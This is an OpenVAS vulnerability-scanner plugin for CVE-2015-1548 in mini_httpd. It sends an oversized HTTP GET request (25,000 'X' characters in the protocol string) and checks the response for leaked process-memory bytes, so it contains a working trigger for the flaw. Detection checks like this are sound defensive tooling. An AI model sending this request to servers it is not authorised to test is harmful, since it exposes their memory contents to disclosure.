###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_mini_httpd_info_disc_vuln.nasl 7160 2017-09-18 07:39:22Z cfischer $
#
# mini_httpd server Long Protocol String Information Disclosure Vulnerability
#
# Authors:
# Shakeel <bshakeel@secpod.com>
#
# Copyright:
# Copyright (C) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805289");
  script_version("$Revision: 7160 $");
  script_cve_id("CVE-2015-1548");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2017-09-18 09:39:22 +0200 (Mon, 18 Sep 2017) $");
  script_tag(name:"creation_date", value:"2015-02-24 16:28:18 +0530 (Tue, 24 Feb 2015)");
  script_name("mini_httpd server Long Protocol String Information Disclosure Vulnerability");

  script_tag(name:"summary", value:"This host is installed with mini_httpd
  server and is prone to information disclosure vulnerability");

  script_tag(name:"vuldetect", value:"Send the crafted HTTP GET request and
  check is it possible to read information from the process memory");

  script_tag(name:"insight", value:"The flaw exists due to an error in the
  'add_headers' function in mini_httpd.c script");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to gain access to potentially sensitive information in the memory.

  Impact Level: Application");

  script_tag(name:"affected", value:"mini_httpd server version 1.21 and prior.");

  script_tag(name:"solution", value:"No solution or patch was made available
  for at least one year since disclosure of this vulnerability. Likely none will
  be provided anymore. General solution options are to upgrade to a newer release,
  disable respective features, remove the product or replace the product by another
  one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_active");

  script_xref(name : "URL" , value : "http://itinsight.hu/en/posts/articles/2015-01-23-mini-httpd");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("mini_httpd/banner");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
minReq = "";
minRes = "";
minPort = 0;
Banner = "";

## Get HTTP Port
minPort = get_http_port(default:80);

## Confirm the application before trying exploit
Banner = get_http_banner(port: minPort);
if(!Banner || "Server: mini_httpd" >!< Banner){
  exit(0);
}

## Construct attack request
minReq = http_get(item:string("/ ", crap(length:25000, data:"X")),
                       port:minPort);

minRes =  http_keepalive_send_recv(port:minPort, data:minReq);

## Check if response contains hexa string,
## 0x2e 0x00 0x69 0x6e 0x64 0x65 0x78 0x2e 0x68 0x74 0x6d 0x6c
if(hexstr(minRes) =~ "2e00696e6465782e68746d6c")
{
  security_message(minPort);
  exit(0);
}
